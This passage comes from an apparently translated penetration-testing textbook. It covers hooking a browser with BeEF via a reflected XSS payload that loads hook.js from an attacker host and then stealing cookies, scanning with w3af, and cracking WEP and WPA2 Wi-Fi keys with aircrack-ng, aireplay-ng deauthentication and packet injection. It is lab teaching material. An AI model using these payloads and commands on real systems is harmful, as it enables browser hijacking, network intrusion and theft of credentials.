  \   |   Hook URL: http://192.168.20.9:3000/hook.js\n[11:53:27]    |_  UI URL:  \
  \ http://192.168.20.9:3000/ui/panel\n[11:53:27][*] RESTful API key: 1c3e8f2c8edd075d09156ee0080fa540a707facf\n\
  [11:53:27][*] HTTP Proxy: http://127.0.0.1:6789\n[11:53:27][*] BeEF server started\
  \ (press control+c to stop)\n```\n\n现在在 Kali 中，访问 `http://192.168.20.9:3000/ui/panel`\
  \ 以进入 BeEF Web 界面。你会看到一个登录页面，如图 14-23 所示。\n\n![BeEF login page](img/httpatomoreillycomsourcenostarchimages2030470.png.jpg)图\
  \ 14-23. BeEF 登录页面\n\nBeEF 的默认凭据是 `beef:beef`。在登录对话框中输入这些凭据后，将显示 Web 界面（图 14-24）。\n\
  \n![BeEF web interface](img/httpatomoreillycomsourcenostarchimages2030472.png.jpg)图\
  \ 14-24. BeEF Web 界面\n\n目前 BeEF 中没有钩住浏览器，因此我们需要欺骗某人加载并运行 BeEF 的恶意 `hook.js` 脚本。让我们回到书籍搜索框中的\
  \ XSS 漏洞。这次，我们不再使用警报对话框，而是利用该漏洞在目标浏览器中加载 BeEF 的 `hook.js`。在 Windows 7 Internet Explorer\
  \ 浏览器中，在书籍搜索框输入 `\"<script src=http://192.168.20.9:3000/hook.js></script>\"` 并点击\
  \ Go。这次用户不会看到警报框或其他提示任何异常的迹象，但如果你回到 BeEF，你应该会在屏幕左侧的“在线浏览器（Online Browsers）”列表中看到\
  \ Windows 7 机器的 IP 地址，如图 14-25 所示。\n\n在详情面板中，在 BeEF 选中 Windows 7 的 IP 地址，你可以看到被钩住浏览器的详细信息以及底层系统，例如版本和已安装的软件。面板顶部有额外的标签，如日志（Logs）和命令（Commands）。点击\
  \ Commands 查看你可以针对钩住的浏览器运行的额外 BeEF 模块。\n\n![A hooked browser](img/httpatomoreillycomsourcenostarchimages2030474.png.jpg)图\
  \ 14-25. 被钩住的浏览器\n\n例如，如图 14-26 所示，导航到 **Browser（浏览器）** ▸ **Hooked Domain（已钩住域名）**\
  \ ▸ **Create Alert Dialog（创建警报对话框）**。在屏幕右侧你有你有更改警报文本。完成后，点击右下角的 Execute（执行）。\n\n\
  ![Running a BeEF module](img/httpatomoreillycomsourcenostarchimages2030476.png.jpg)图\
  \ 14-26. 运行 BeEF 模块\n\n回到你的 Windows 7 浏览器。你应该看到弹出对话框，如图 14-27 所示。\n\n![Causing an\
  \ alert in the hooked browser](img/httpatomoreillycomsourcenostarchimages2030478.png.jpg)图\
  \ 14-27. 在钩住的浏览器中触发警报\n\n另一个有趣的 BeEF 允许你从浏览器窃取数据。在 Windows 7 系统上，在 BeEF 模块中导航到 **Host（主机）**\
  \ ▸ **Get Cookie（获取 Cookie）**。结果显示在右侧，如图 14-28 所示。\n\n![Stealing information](img/httpatomoreillycomsourcenostarchimages2030480.png.jpg)图\
  \ 14-28. 窃取信息\n\n在本节中，我们查看了钩住浏览器的简单示例。还有很多可以做的。例如，我们可以使用 BeEF 作为跳板进行网络探测扫描，甚至是端口扫描。你甚至可以将\
  \ BeEF 与 Metasploit 集成。在渗透测试中，如果你能在客户端上发现 XSS，你可以利用 BeEF 进行社会工程学攻击。\n\n跨站请求伪造\n\n\
  XSS 利用的是用户对网站的信任，而一种被称为`跨站请求伪造 (CSRF)`的类似漏洞利用的是网站对用户的信任。考虑以下场景：用户登录了银行网站并拥有活动会话\
  \ Cookie。自然地，用户在其他标签页中浏览其他网站。\n\n使用 w3af 进行 Web 应用扫描\n\n自动化测试非常困难，特别是对于自定义应用程序。没有什么比得上带有代理的\
  \ Web 应用测试人员。但是，许多商业 Web 应用扫描器和一些免费开源扫描器可以自动执行任务。\n\n一个开源的 Web 应用扫描器是`Web 攻击与审计框架\
  \ (w3af)`。w3af 由执行不同 Web 应用任务的插件组成，例如寻找 URL 和参数进行 SQL 注入。\n\n现在如下所示启动 w3af。\n\n\
  ```\nroot@kali:~# w3af\n```\n\nw3af GUI 将启动并看起来类似于图 14-29。屏幕左侧是扫描配置方案。默认情况下，你处于一个空配置，这允许你完全自定义针对目标运行的\
  \ w3af 插件。你也可以使用几个预配置的方案。例如，`OWASP_Top10` 方案将使用发现（discovery）部分的插件扫描应用程序，并运行审计（audit）部分的插件来寻找来自开放\
  \ Web 应用安全项目（OWASP）十大漏洞类别的漏洞。输入要扫描的 URL，如图 14-29 所示，并点击窗口右侧的 Start（开始）。\n\n扫描运行时，详细将在显示在\
  \ Logs（日志）标签页中，发现的问题将添加到 Results（结果）标签页中（图 14-30）。\n\n![Using w3af](img/httpatomoreillycomsourcenostarchimages2030482.png.jpg)图\
  \ 14-29. 使用 w3af\n\n\n\n\n\n![w3af results](img/httpatomoreillycomsourcenostarchimages2030484.png.jpg)图\
  \ 14-30. w3af 结果\n\n`w3af` 发现了我们在本章开头所利用的 SQL 注入漏洞，以及一些值得添加到你的渗透测试报告中的次要问题。你可以尝试其他\
  \ `w3af` 配置文件，或者创建你自己的配置，以自定义针对应用程序运行哪些插件。`w3af` 甚至可以进行凭据扫描，即它与应用程序保持一个活跃的登录会话，从而能够访问额外的功能来搜索问题。\n\
  \n## 总结\n\n在本章中，我们简要查看了常见的 Web 应用程序漏洞示例，这些示例是构建在一个示例应用程序上的，而该应用缺乏缓解许多攻击所需的输入过滤。我们的书籍服务应用程序在书籍详情页中存在一个\
  \ SQL 注入漏洞。我们能够从数据库中提取数据，甚至获取了系统命令 shell 壳。\n\n我们在基于 XML 的登录功能中发现了类似的注入漏洞。我们能够使用构造的查询来绕过身份验证，并以\
  \ `AuthInfo.xml` 文件中存储的第一个用户身份登录。我们还可以利用时事通讯页面查看 Web 应用程序中任意页面的源代码，包括身份验证信息——这是页面缺乏访问控制以及本地文件包含漏洞的结果。我们能够通过将用于订阅时事通讯的电子邮件地址进行链来在系统上运行命令，并将命令输出写入文件，然后通过浏览器访问它们。我们在搜索功能中发现了一个反射型\
  \ XSS 示例。我们使用 `BeEF` 来利用这个 XSS 问题并获得对目标浏览器的控制，从而在系统中建立了立足点。最后，我们简要查看了一个开源 Web 漏洞扫描器\
  \ `w3af`。\n\nWeb 应用程序测试值得讨论的内容比我们在书中能投入的要得多。本章涵盖的所有问题在 OWASP 网站 `[`www.owasp.org/index.php/Main_Page/`](https://www.owasp.org/index.php/Main_Page/)`\
  \ 上都有详细讨论，该网站是你继续学习 Web 应用程序安全的良好起点。OWASP 还发布了一个名为 `Webgoat` 的易漏洞应用程序，它通过练习让用户获得利用如本章中以及其他类似的\
  \ Web 应用程序问题的实战经验。如果你想学习更多测试 Web 应用的知识，完成 `Webgoat` 的练习是一个极佳的下一步。\n\n另一个需要注意的是，我们的应用程序是一个运行在\
  \ Windows 上的 ASP.net 程序。在你的渗透测试生涯，你会遇到其他类型的应用程序，例如运行在 Linux 上的 Apache/PHP/MySQL\
  \ ，或 Java Web 应用程序。你可能还会发现使用 `REST` 和 `SOAP` 等 API 传输数据的应用程序。虽然由于输入过滤导致的底层问题可能发生在任何平台上，但特定的编码错误和利用它们的语法可能会有所不同。在继续学习\
  \ Web 应用程序安全的同时，务必熟悉不同的应用程序。\n\n## 第 15 章。无线攻击\n\n在本章中，我们将简要查看无线安全。到目前为止，我们已经查看了多种突破安全边界的方法。但如果攻击者坐在目标组织建筑前的长椅上，而该组织为内部网络提供了加密的无线访问，那么\
  \ Web 应用程序安全、防火墙、安全意识培训等都无法保护内部网络。\n\n## 设置\n\n对于本章中的示例，我将使用一个 `Linksys WRT54G2`\
  \ 无线路由器，但任何支持 WEP 和 WPA2 加密的路由器都可以工作。默认情况下，我的 Linksys 路由器在 `http://192.168.20.1`\
  \ 处有一个 Web 管理界面，如图 15-1 所示。路由器的默认用户名和密码为 `admin:admin`。默认凭据因设备而异，但在渗透测试中，发现仍在使用默认凭据的路由设备是常见的——这种失败可能允许攻击者获得对路由器的管理控制权。\n\
  \n### 注意事项\n\n我们不会在书中介绍攻击网络设备，但请查看你拥有的任何网络设备的管理界面。攻击者对企业级网络设备的访问会造成巨大的损害，不应被忽视。\n\
  \n![Linksys WRT54G2 web interface](img/httpatomoreillycomsourcenostarchimages2030486.png.jpg)图\
  \ 15-1. Linksys WRT54G2 Web 界面\n\n我还将使用一个 `Alfa Networks AWUS036H` USB 无线网卡。此网卡以及类似的\
  \ Alfa USB 模型是无线安全评估的理想选择，特别是在处理虚拟机时。VMware 没有无线网卡的驱动程序，但它支持 USB 透传，允许我们从虚拟机中使用\
  \ Kali Linux 内置的无线驱动程序。使用 USB 无线网卡将允许我们从虚拟机评估无线网络。\n\n### 查看可用的无线接口\n\n在将 Alfa 无线网卡连接到\
  \ Kali 虚拟机后，输入 `iwconfig` 查看虚拟机上可用的无线接口。注意，在我的情况下，Alfa 卡被挂载为 `wlan0` ❶，如示例 15-1\
  \ 所示。\n\n示例 15-1. Kali Linux 无线接口\n\n```\nroot@kali:~# iwconfig\nwlan0:802.11 ESSID:off\
  \          Mode:Managed\n          Frequency:2.412 GHz (Channel 1)  Quality=0/0\
  \  Signal level=0 dBm \n          Bit Rate:0 Mbps  Encryption:none\nPower Management:off\n\
  \nlo        no extensions.\n\neth0      no extensions.\n```\n\n### 扫描访问点\n\n现在我们可以扫描附近的访问点。命令\
  \ `iwlist wlan0 scan` 将使用 `wlan0` 接口扫描附近的访问点，如示例 15-2 所示。\n\n示例 15-2. 扫描访问点\n\n\
  ```\nroot@kali:~# iwlist wlan0 scan\n  Cell 02 - Address: 00:23:69:F5:B4:2B\n  \
  \                  Channel:6\n                    Frequency:2.437 GHz (Channel 6)\n\
  \                    Quality=47/70  Signal level=-63 dBm\n                    Encryption\
  \ key:off\n                    ESSID:\"linksys\"\n                    Bit Rates:1\
  \ Mb/s; 2 Mb/s; 5.5 Mb/s; 11 Mb/s; 6 Mb/s\n                              9 Mb/s;\
  \ 14 Mb/s; 18 Mb/s\n                    Bit Rates:24 Mb/s; 36 Mb/s; 48 Mb/s; 54\
  \ Mb/s\n                    Mode:Master\n--snip--\n```\n\n从这次初始扫描中，我们收集了攻击基站所需的所有信息，正如你将在本章晚些部分看到的。我们有了\
  \ MAC 地址 ❶、它广播的通道 ❷、了解到目前没有使用加密 ❸，以及它的 SSID ❹。\n\n## 监听模式\n\n在继续之前，让我们将 Alfa 卡切换到监听模式。类似于\
  \ Wireshark 中的混杂模式，监听模式允许我们看到目标无线网卡之外的额外无线流量。我们将使用 Aircrack-ng 无线评估套件中的 `airmon-ng`\
  \ 脚本将 Alfa 卡设置为监听模式。首先，通过输入 `airmon-ng check` 确保没有运行中的进程会干扰监听模式，如示例 15-3 所示。\n\n\
  示例 15-3. 检查干扰进程\n\n```\nroot@kali:~# airmon-ng check\nFound 2 processes that could\
  \ cause trouble.\nIf airodump-ng, aireplay-ng or airtun-ng stops working after\n\
  a short period of time, you may want to kill (some of) them!\n-e\nPID     Name\n\
  2714    NetworkManager\n5664    wpa_supplicant\n```\n\n\n\n\n\n如你所示，Airmon 发现了两个可能干扰的运行进程。取决于你的无线网卡及其驱动程序，如果你不杀死这些程序，可能会遇到或不会遇到问题。我们正在使用的网卡应该没有问题，但某些\
  \ USB 无线网卡确实会有。要一步杀死所有干扰进程，请输入 `airmon-ng check kill`，如示例 15-4 所示。\n\n#### 示例 15-4.杀死干扰进程\n\
  \n```\nroot@kali:~# airmon-ng check kill\nFound 2 processes that could cause trouble.\n\
  If airodump-ng, aireplay-ng or airtun-ng stops working after\na short period of\
  \ time, you may want to kill (some of) them!\n-e\nPID     Name\n2714    NetworkManager\n\
  5664    wpa_supplicant\nKilling all those processes...\n```\n\n现在输入 `airmon-ng start\
  \ wlan0` 将无线接口切换到监听模式，如示例 15-5 所示。这将允许我们捕获并非我们的数据包。Airmon-ng 创建了无线接口 `mon0` ❶。\n\
  \n#### 示例 15-5.将 Alfa 卡设置为监听模式\n\n```\nroot@kali:~# airmon-ng start wlan0\nInterface\
  \    Chipset             Driver\nwlan0        Realtek RTL8187L    rtl8187 - [phy0]\n\
  \             (monitor mode enabled on mon0) ❶\n```\n\n## 捕获数据包\n\n随着接口进入监听模式，让我们看看使用\
  \ Aircrack-ng 件中的 Airodump-ng 可以收集到什么数据。Airodump-ng 用于捕获和保存无线包。示例 15-6 显示了我们如何告诉\
  \ Airodump-ng 使用监听模式下的无线接口 `mon0`。\n\n#### 示例 15-6.使用 Airodump-ng 开始数据包转储\n\n```\n\
  root@kali:~# airodump-ng mon0 --channel 6\n CH  6 ][ Elapsed: 28 s ] 2015-05-19\
  \ 20:08\n\n BSSID                 PWR    Beacons    #Data, #/s   CH   MB   ENC \
  \ CIPHER AUTH ESSID\n\n 00:23:69:F5:B4:2B❶   -30         53        2    0    6 \
  \  54 . OPN❷             linksys❸\n BSSID               STATION               PWR\
  \   Rate    Lost    Frames   Probe\n\n 00:23:69:F5:B4:2B   70:56:81:B2:F0:53❹  \
  \ -21   0       -54     42       19\n```\n\nAirodump-ng 的输出收集了关于无线包的信息，包括基础服务集标识符\
  \ (BSSID)，它是基站的 MAC 地址 ❶。我们还看到了其他信息，例如用于无线安全性的加密算法 ❷ 以及服务集标识符 (SSID) ❸。Airodump-ng\
  \ 还会获取已连接客户端的 MAC 地址 ❹ 以及连接到无线接入点的宿主机 MAC 地址。（在我们在本章稍后破解无线安全加密时，我们将检查 Airodump-ng\
  \ 输出中的其他字段。）\n\n现在我们知道 Linksys 接入点是开放的，没有任何安全防护。\n\n## 开放无线\n\n从安全角度来看，开放无线网络是一场真正的灾难，因为在接入点天线范围内的任何人都可以连接到该网络。虽然开放网络在连接后可能需要身份验证（有些确实如此），但许多网络直接允许任何人连接。\n\
  \n此外，通过开放网络传输的无线包没有经过加密，任何监听者都可以看到明文中的任何数据。敏感数据可能会通过 SSL 等协议受到保护，但并非总是如此。例如，开放无线网络上的\
  \ FTP 流量是完全未加密的，包括登录信息，我们甚至不需要使用 `ARP` 或 `DNS` 缓存污染来捕获数据包。任何处于监听模式的无线网卡都能看到未加密的流量。\n\
  \n现在让我们来看看那些部署了各种安全协议的网络，这些协议可以防止不受实体连接到网络并拦截流量。\n\n## 有线等效隐私\n\n许多默认启用加密的路由器使用一种名为\
  \ `wired equivalent privacy (WEP)` 的旧式加密技术。WEP 的根本问题在于，其算法中的缺陷使得攻击者能够恢复任何 WEP 密钥。WEP\
  \ 使用里维斯特密码 4 (`RC4`) 流加密算法和预共享密钥。任何想要连接到网络的人都可以使用相同的由十六进制数字字符串组成的密钥进行加密和解密。明文（未加密）的数据通过与密钥流进行独异或\
  \ (`XOR`) 位运算，以创建加密后的密文。\n\n位 `XOR` 运算有四种可能：\n\n*   `0 XOR 0 = 0`\n*   `1 XOR 0\
  \ = 1`\n*   `0 XOR 1 = 1`\n*   `1 XOR 1 = 0`\n\n### 注意\n\n密码分析人员经常发现加密算法中的随机性没有被正确实现，WEP\
  \ 就是如此。首先，WEP 的 24 位随机化在现代标准下是极小的。\n\nIV 和密钥连接后，然后通过密钥调度算法 (`KSA`) 和伪随机数生成器 (`PRNG`)\
  \ 生成密钥流。（此处将省略数学推导。）接下来，在加密之前计算一个完整性检查值 (`ICV`) 并与明文连接，以防止攻击者拦截密文、翻转某些位并使生成的明文变为恶意或至少是误导性的。然后将明文与密钥流进行\
  \ `XOR` 运算（如[图 15-2 所示）。生成的包由 IV、ICV、密文和一个双密钥 ID 组成，如图 15-4 所示。\n\n![WEP 加密](img/httpatomoreillycomsourcenostarchimages2030488.png)图\
  \ 15-2. WEP 加密\n\n解密过程类似，如图 15-5 所示。作为数据包一部分明文存储的 IV 和密钥（由密钥 ID 指定）连接后，通过相同的密钥调度算法和伪随机数生成器，产生与加密时相同的密钥流。然后将密文与密钥流进行\
  \ `XOR` 运算以恢复明文和 ICV。最后，将解密后的 ICV 与数据包附加的明文 ICV 值进行比较。如果值不匹配，则该数据包被丢弃。\n\n![WEP\
  \ 解密](img/httpatomoreillycomsourcenostarchimages2030490.png)图 15-5. WEP 解密\n\n\n\
  \n\n遗憾的是，WEP 存在一些固有问题，允许攻击者恢复密钥或修改合法的数据包。事实上，任何 WEP 密钥都可以被拥有足够数量相同共享密钥加密的密文的攻击者所恢复。唯一真正安全的加密系统是随机的一次性填充扇码（one-time\
  \ pad），它只使用一次特定的密钥。WEP 的主要问题是 24 位 `IV` 引入的随机性不够；它最多只有 `2²⁴`（即 16,777,216）个值。\n\n\
  无线网卡和接入点之间没有标准的方法来计算 `IVs`，在实践中，使用的 `IV` 空间可能更小。无论如何，只要有足够的数据包，`IVs` 就会被重用，相同的值（静态密钥与\
  \ `IV` 拼接）将用于用于生成密文。通过被动监听流量（或者更好的是向网络注入流量以强制产生更多数据包，从而生成更多的 `IVs`），攻击者可以收集足够的数据包来执行密码学分析并恢复密钥。\n\
  \n同样，`ICV` 试图防止攻击者拦截加密消息、翻转位并更改结果明文的功能也是不足的。遗憾的是，`ICV` 实现中的循环冗余校验 32 (`CRC-32`)\
  \ 缺陷可能允许攻击者为修改后的消息构造出正确的 `ICV`。由于 `CRC-32` 是一个线性算法，翻转密文中的特定位会对生成的 `ICV` 产生确定性的结果，了解\
  \ `CRC-32` 计算方式的攻击者可以导致修改后的消息被接受。因此，`ICV` 实现像 `IV` 一样，在现代密码学标准下不认为是稳健的。\n\n我们可以使用\
  \ `Aircrack-ng` 套件从受 WEP 保护的无线网络中恢复共享密钥。再次，密码学攻击背后的数学原理超出了本书的范围。幸运的是，如果我们能捕获到所需的流量，就有工具可以处理这些棘手的工作。\n\
  \n### 使用 Aircrack-ng 破解 WEP 密钥\n\n破解 WEP 密钥有多种方法，包括伪造认证攻击、分段攻击、chopchop 攻击、caffé\
  \ latte 攻击和 PTW 攻击。我们将仔细查看伪造认证攻击，它要求至少有一个合法客户端连接到接入点。\n\n我们将使用主机系统来模拟已连接的客户端。首先，将你的路由器的无线安全设置为\
  \ WEP（如果需要帮助，请查看用户指南），然后确保你的无线网卡处于监听模式（monitor mode），以便你可以在无需先认证的情况下捕获网络流量。\n\n\
  现在让我们看看使用 `Aircrack-ng` 中的 `Airodump-ng` 工具可以收集什么数据。告诉 `Airodump-ng` 使用监听模式下的无线接口\
  \ `mon0`，如[示例 15-7]所示，并使用 `-w` 标记将所有数据包保存到文件中。\n\n示例 15-7 用于 WEP 密码学分析的 Airodump-ng\
  \ 捕获\n\n```\nroot@kali:~# airodump-ng -w book mon0 --channel 6\n CH  6 ][ Elapsed:\
  \ 20 s ][ 2015-03-06 19:08\n BSSID                 PWR    Beacons    #Data, #/s\
  \   CH    MB   ENC    CIPHER AUTH ESSID\n 00:23:69:F5:B4:2B❶   -53         22  \
  \       6   0    6❷  54 . WEP❸  WEP         linksys❹\n BSSID                 STATION\
  \               PWR   Rate    Lost    Frames   Probe\n 00:23:69:F5:B4:2B     70:56:81:B2:F0:53\
  \     -26   54-54      0         6\n```\n\n这次初始扫描了我们开始对基站进行 WEP 攻击所需的所有信息。这里有 BSSID\
  \ ❶、无线通道 ❷、加密算法 ❸ 和 SSID ❹。我们将使用这些信息来收集破解 WEP 密钥的数据包。当然，你自己的设置信息可能不同，但这是我们将处理的内容：\n\
  \n* **基站 MAC 地址**: 00:23:69:F5:B4:2B\n* **SSID**: linksys\n* **通道**: 6\n\n#### 注入数据包\n\
  \n尽管示例 15-7 中的 `Airodump-ng` 输出显示了来自来自接入点的流量，但要破解 64 位 WEP 密钥，我们需要大约 250,000 个 `IVs`，对于\
  \ 148 位 WEP 密钥，则大约需要 1,500,000 个。与其闲地监听数据包，我们将捕获并重传数据包到接入点以快速生成唯一的 `IVs`。我们需要认证，因为如果我们的\
  \ MAC 地址没有通过接入点的认证，我们发送的任何数据包将被丢弃，并且我们会收到去认证请求。我们将使用 `Aireplay-ng` 与接入点进行伪造认证，并欺骗它响应我们注入的数据包。\n\
  \n在使用伪造认证时，我们告诉接入点我们准备好证明我们知道 WEP 密钥，如[示例 15-8]所示。当然，由于我们还不知道密钥，所以我们不发送它，但我们的 MAC\
  \ 地址现在已经在可以向接入点发送数据包的客户端列表中，因此这就是伪造认证。\n\n示例 15-8 使用 Aireplay-ng 进行伪造认证\n\n```\n\
  root@kali:~# aireplay-ng -1 0 -e linksys -a 00:23:69:F5:B4:2B -h 00:C0:CA:1B:69:AA\
  \ mon0\n20:02:56  Waiting for beacon frame (BSSID: 00:23:69:F5:B4:2B) on channel\
  \ 6\n\n20:02:56  Sending Authentication Request (Open System) [ACK]\n20:02:56  Authentication\
  \ successful\n20:02:56  Sending Association Request [ACK]\n20:02:56  Association\
  \ successful\n20:02:56  (AID: 1\n```\n\n我们使用以下标记：\n\n* `-1`  `Aireplay-ng` 进行伪造认证。\n\
  * `0` 是重传时间。\n* `-e` 是 SSID；在我的案例中 `linkys`。\n* `-a` 是接入点的 MAC 地址。\n* `-h` 是我们卡的\
  \ MAC 地址。\n* `mon0` 是使用的接口。\n\n发送 `Aireplay-ng` 请求后，你应该收到一个笑脸并表示认证成功❶\n\n#### 使用\
  \ ARP 请求生成 IVs\n\n当基站接受数据包后，我们可以捕获并重传数据包。我们将使用名为 *ARP Request Relay*（ARP 请求继）的技术快速生成\
  \ `IVs`，让 `Aireplay-ng` 监听 ARP 请求并将其回基站（当接入点接收到 ARP 请求时，它会带有新的 `IV` 进行广播）。\n\n示例\
  \ 15-9 显示了攻击的运行情况。`Aireplay-ng` 读取数据包以寻找 ARP 请求。在 `Aireplay-ng` 看到可以广播的 ARP 请求之前，你看不到任何数据。我们接下来查看。\n\
  \n示例 15-9 使用 Aireplay-ng 广播 ARP 数据包\n\n```\nroot@kali:~# aireplay-ng -3 -b 00:23:69:F5:B4:2B\
  \ -h 00:C0:CA:1B:69:AA mon0\n20:14:21  Waiting for beacon frame (BSSID: 00:23:69:F5:B4:2B)\
  \ on channel 6\nSaving ARP requests in replay_arp-1142-201521.cap\n你还应该启动 airodump-ng\
  \ 来捕获回复。\nRead 541 packets (got 0 ARP requests and 0 ACKs), sent 0 packets...(0\
  \ pps)\n```\n\n我们使用这些选项：\n\n* `-3` 执行 ARP 请求复制攻击。\n* `-b` 是基站 MAC 地址。\n* `-h` 是我们的\
  \ Alfa 卡 MAC 地址。\n* `mon0` 是接口。\n\n\n\n\n\n遗憾的是，如你在示例 15-9 中所示，我们没有看到任何 ARP 请求。为了生成\
  \ ARP 请求，我们将使用主机系统作为模拟客户端，通过从连接的主机系统 `ping` 网络上的某个 IP 地址。`Aireplay-ng` 将看到 ARP 请求并不断地将其重传到接入点。\n\
  \n如你在示例 15-10 中显示的 Airodump-ng 屏幕所示，`#Data` ❶ 数字（表示捕获的 IVs）随着 `Aireplay-ng` 持续重传\
  \ ARP 数据包，数量正在迅速增加，这导致接入点生成更多的 IVs。（如果你的 `aireplay-ng -3` 显示 `\"Got adeauth/disassoc\"\
  ` 或类似内容，且你的 `#Data` 数字没有快速上升，请再次运行示例 15-8 中的伪关联命令以重新关联接入点。你的 `#Data` 字段应该再次开始快速上升。）\n\
  \n示例 15-10. 在 Airodump-ng 中捕获 IVs\n\n```\nCH  6 ][ Elapsed: 14 mins ] 2015-11-22\
  \ 20:31\n\nBSSID               PWR  RXQ  Beacons    #Data, #/s    CH   MB   ENC\
  \    CIPHER AUTH ESSID\n\n00:23:69:F5:B4:2B   -63   92     5740    85143❶ 389  \
  \   6   54 . WEP    WEP   OPN  linksys\n```\n\n#### 破解密钥\n\n记住，我们需要大约 250,000 个\
  \ IVs 来破解一个 64 位的 WEP 密钥。只要你保持与基站的关联状态（如[示例 15-8 所示，在必要时重新运行命令），并在网络上生成了 ARP 请求，只需要几分钟就能收集到足够的\
  \ IVs。一旦我们收集了足够的 IVs，就可以使用 `Aircrack-ng` 进行计算，将收集到的 IVs 转换为正确的 WEP 密钥。示例 15-11 展示了我们如何通过\
  \ `-b` 标志并提供在 Airodump-ng 中使用的文件名后跟 `*.cap` ❶ 来破解密钥。这告诉 `Aircrack-ng` 读取由 Airodump-ng\
  \ 保存的所有 `.*cap` 文件。\n\n示例 15-11. 使用 Aircrack-ng 恢复 WEP 密钥\n\n```\nroot@kali:~# aircrack-ng\
  \ -b 00:23:69:F5:B4:2B book*.cap❶\nOpening book-01.cap\nAttack will be restarted\
  \ every 5000 captured ivs.\nStarting PTW attack with 239400 ivs.\nKEY FOUND! [ 2C:85:8B:B6:31\
  \ ] ❷\nDecrypted correctly: 100%\n```\n\n在分析几秒钟后，`Aircrack-ng` 返回了密钥。\n\n\n\n\n\
  在接入点与 supplic 者（客户端）连接的第一阶段，会创建一个在整个会话期间保持静态的成对密钥（`PMK`）。该密钥并不是直接用于加密的密钥，但它将在第二阶段使用。在第二阶段，接入点与客户端之间将进行四次握手，目的是建立通信通道并交换用于后续数据通信的加密密钥，如图图\
  \ 15-7 所示。\n\n![WPA/WPA2 four-way handshake](img/httpatomoreillycomsourcenostarchimages2030498.png.jpg)图\
  \ 15-7. WPA/WPA2 四次握手\n\n该 `PMK` 由以下内容生成：\n\n* 口密码（预共享密钥，或 `PSK`）\n* 接入点的 `SSID`\n\
  * `SSID` 长度\n* 哈希迭代次数（`4096`）\n* 生成的共享密钥（`PMK`）的位长度（`256`）\n\n这些值被输入到名为 `PBKDF2`\
  \ 的哈希算法中，创建一个 256 位共享密钥（`PMK`）。虽然你的密码（`PSK`）可能是 `GeorgiaIsAwesome`，但这并不是第二阶段将使用的\
  \ `PMK`。尽管如此，任何知道密码和接入点 `SSID` 的人都可以使用 `PBKDF2` 算法生成正确的 `PMK`。在四次握手期间，会创建一个成对瞬时密钥（`PTK`），用于加密接入点与客户端之间的流量；同时会交换一个组瞬时密钥（`GTK`），用于加密广播流量。`PTK`\
  \ 由以下部分组成：\n\n* 共享密钥（`PMK`）\n* 来自接入点的随机数（`ANOnce`）\n* 来自客户端的随机数（`SNonce`）\n* 客户端的\
  \ MAC 地址\n* 接入点的 MAC 地址\n\n这些值被输入 `PBKDF2` 哈希算法以创建 `PTK`。\n\n为了生成 `PTK`，接入点和客户端会交换\
  \ MAC 地址和随机数（随机值）。静态共享密钥（`PMK`）永远不会在空中传输，因为接入点和客户端都知道密码（`PSK`），因此可以独立生成共享密钥。\n\n\
  共享随机数和 MAC 地址被客户端和接入点用于生成 `PTK`。在四次握手的第一步中，接入点发送其随机数（`ANonce`）。接下来，客户端选择一个随机数，生成\
  \ `PTK`，并将其随机数（`SNonce`）发送给接入点。（`SNonce` 中的 `S` 代表 supplicant，这是无线设置中客户端的另一个名称。）\n\
  \n除了发送随机数外，客户端还会发送一个消息完整性代码（`MIC`）以防止伪造攻击。为了计算正确的 `MIC`，用于生成预共享密钥的密码必须正确，否则 `PTK`\
  \ 将是错误的。接入点根据客户端发送的 `SNonce` 和 MAC 地址独立地生成 `PTK`，然后检查客户端发送的 `MIC`。如果它是正确的，则表示客户端身份验证成功，接入点将\
  \ `GTK` 加上 `MIC` 发送给客户端。\n\n在握手的第四部分，客户端会对 `GTK` 进行确认。\n\n### 破解 WPA/WPA2 密钥\n\n\
  与 WEP 不同，WPA 和 WPA2 中使用的加密算法足够强大，可以防止攻击者仅通过捕获足够的流量并进行密码分析来恢复密钥。WPA/WPA2 个人网络的致命喀斯底在于所使用的预共享密钥（密码）的质量。如果你在渗透后发现的\
  \ Windows `Administrator` 密码与 WPA 或 WPA2 个人密码相同，或者密码写在组织前台的白板上，那么大局就结束了。\n\n为了尝试猜测弱密码，我们首先需要捕获四次握手进行分析。记住，给定正确的密码和接入点的\
  \ `SSID`，可以使用 `PBKDF2` 哈希算法生成共享密钥（`PMK`）。在有了 `PMK` 后，我们仍然需要 `ANonce`、`SNonce` 以及接入点和客户端的\
  \ MAC 地址来计算 `PTK`。当然，每个客户端的 `PTK` 都不同，因为随机数在每次四次握手中都会是不同的，但如果我们能从任何合法客户端处捕获四次握手，就可以使用其\
  \ MAC 地址和随机数为给定的密码计算 `PTK`。例如，我们可以使用 `SSID` 和密码 `password` 生成一个 `PMK`，然后将生成的 `PMK`\
  \ 与捕获的随机数和 MAC 地址结合以计算 `PTK`。如果生成的 `MIC` 与捕获握手中的 相同，我们就知道 `password` 是正确的密码。这种技术可以应用于可能密码的字典列表以尝试猜测正确的密码。幸运的是，如果我们能捕获四次握手并提供字典列表，我们就有\
  \ `Aircrack-ng` 来处理所有的数学计算。\n\n#### 使用 Aircrack-ng 破解 WPA/WPA2 密钥\n\n要使用 `Aircrack-ng`\
  \ 破解 WPA/WPA2，首先将你的无线接入点设置为 WPA2 个人。选择一个预共享密钥（密码），然后将主机系统连接到接入点以模拟真实客户端。\n\n要使用字典列表猜测\
  \ WPA2 预共享密钥（密码），我们需要捕获四次握手。输入 `airodump-ng -c 6` 指定通道，`--bssid` 指定 MAC 地址，`-w`\
  \ 指定文件名，使用 `mon0` 指定接口，如示例 15-12 所示。\n\n```\nairodump-ng -c 6 --bssid 00:23:69:F5:B4:2B\
  \ -w pentest mon0\n```\n\n要强制客户端重新连接，使用 `Aireplay-ng` 向客户端发送去身份认证。我们需要 `Aireplay-ng`\
  \ 的选项有：\n\n* `-0` 表示去身份认证。\n* `1` 是发送的去身份认证请求数。\n* `-a 00:14:6C:7E:40:80` 是基站的 MAC\
  \ 地址。\n* `-c 00:0F:B5:FD:FB:C2` 是客户端的 MAC 地址。\n\n```\naireplay-ng -0 1 -a 00:14:6C:7E:40:80\
  \ -c 00:0F:B5:FD:FB:C2 mon0\n```\n\n现在回到 Airodump-ng 窗口，如示例 15-14 所示。\n\n\n\n\n\n\
  \n如果 `Airodump-ng` 捕获到与客户端四次握手，它将其记录在捕获输出的第一行 ❶。\n\n一旦你捕获了 WPA2 握手，关闭 `Airodump-ng`\
  \ 并使用 `File Open filename.cap` 在 Wireshark 中打开 `.cap` 文件。在 Wireshark 中，过滤 `eapol`\
